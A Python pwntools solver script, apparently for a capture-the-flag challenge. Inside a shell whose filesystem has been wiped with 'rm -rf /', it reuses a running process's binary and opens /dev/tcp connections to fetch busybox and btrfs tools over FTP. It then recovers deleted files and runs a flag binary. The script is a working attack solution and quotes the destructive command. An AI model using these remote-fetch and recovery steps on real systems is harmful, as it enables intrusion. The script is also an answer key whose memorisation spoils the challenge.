#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import re

import pwnlib.tubes


def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))


r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(r.recvuntil(b'== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)


def extract_number(line):
    num = re.match(rb'^[0-9]+', line).group(0)
    return int(num)


print(r.recvuntil(b'cp this_copy_will_never_finish right? &'))
print(r.recvline())
print(r.recvuntil(b'[1] '))

line = r.recvline()
print(line)
cp_pid = extract_number(line)

print(r.recvuntil(b'btrfs-find-root /dev/vda'))
print(r.recvuntil(b'Found tree root at '))

line = r.recvline()
print(line)
tree_root_addr = extract_number(line)

print(r.recvuntil(b'rm -rfv / --no-preserve-root 2> /dev/null'))
print(r.recvuntil(b'/ #'))

r.sendline(b'cd /tmp')
print(r.recvuntil(b'/tmp #'))

r.sendline(f'/proc/{cp_pid}/exe /proc/{cp_pid}/exe busybox'.encode())
print(r.recvuntil(b'/tmp #'))

r.send(br'''\
cat() {
  cat_inner() {
    while LANG=C IFS= read -r -d '' DATA || (printf '%s' "$DATA"; false); do
      printf '%s\0' "$DATA"
    done
  }

  if [[ $# -eq 0 ]]; then
    cat_inner
  else
    for FILE in "$@"; do
      if [[ $FILE == '-' ]]; then
        cat_inner
      else
        cat_inner < "$FILE"
      fi
    done
  fi
}
''')
print(r.recvuntil(b'/tmp #'))

r.sendline(b'exec 3<> /dev/tcp/10.0.2.2/2121')
print(r.recvuntil(b'/tmp #'))
r.sendline(b'read LINE <&3; echo "$LINE"')
print(r.recvuntil(b'/tmp #'))

r.sendline(br'printf "USER anonymous\r\n" >&3')
print(r.recvuntil(b'/tmp #'))
r.sendline(b'read LINE <&3; echo "$LINE"')
print(r.recvuntil(b'/tmp #'))

r.sendline(br'printf "PASS\r\n" >&3')
print(r.recvuntil(b'/tmp #'))
r.sendline(b'read LINE <&3; echo "$LINE"')
print(r.recvuntil(b'/tmp #'))

r.sendline(br'printf "EPSV\r\n" >&3')
print(r.recvuntil(b'/tmp #'))
r.sendline(b'read LINE <&3; echo "$LINE"')

print(r.recvuntil(b'Entering extended passive mode (|||'))

line = r.recvline()
print(line)
ep_port = extract_number(line)

print(r.recvuntil(b'/tmp #'))

r.sendline(f'exec 4<> /dev/tcp/10.0.2.2/{ep_port}'.encode())
print(r.recvuntil(b'/tmp #'))

r.sendline(br'printf "TYPE I\r\n" >&3')
print(r.recvuntil(b'/tmp #'))
r.sendline(b'read LINE <&3; echo "$LINE"')
print(r.recvuntil(b'/tmp #'))

r.sendline(br'printf "RETR busybox\r\n" >&3')
print(r.recvuntil(b'/tmp #'))
r.sendline(b'read LINE <&3; echo "$LINE"')
print(r.recvuntil(b'/tmp #'))

if True:
    exit(0)

r.sendline(b'cat <&4 > busybox')
print(r.recvuntil(b'/tmp #'))

r.sendline(b'./busybox wget ftp://10.0.2.2:2121/btrfs')
print(r.recvuntil(b'/tmp #'))

r.sendline(b'./busybox chmod a+x ./btrfs')
print(r.recvuntil(b'/tmp #'))

r.sendline(b'./busybox mknod vda b 254 0')
print(r.recvuntil(b'/tmp #'))

r.sendline(b'./busybox mkdir restore')
print(r.recvuntil(b'/tmp #'))

r.sendline(f'./btrfs restore -ivt {tree_root_addr} --path-regex '
           "'^/(|usr(|/local(|/bin(|/.*))))$' vda restore/".encode())
print(r.recvuntil(b'/tmp #'))

r.sendline(b'./busybox mkdir restore')
print(r.recvuntil(b'/tmp #'))

r.sendline(b'./busybox chmod a+x restore/usr/local/bin/get_flag')
print(r.recvuntil(b'/tmp #'))

r.sendline(b'restore/usr/local/bin/get_flag')

print(r.recvuntil((b'CTF{', b'uiuctf{')))
print(r.recvuntil((b'}')))

exit(0)
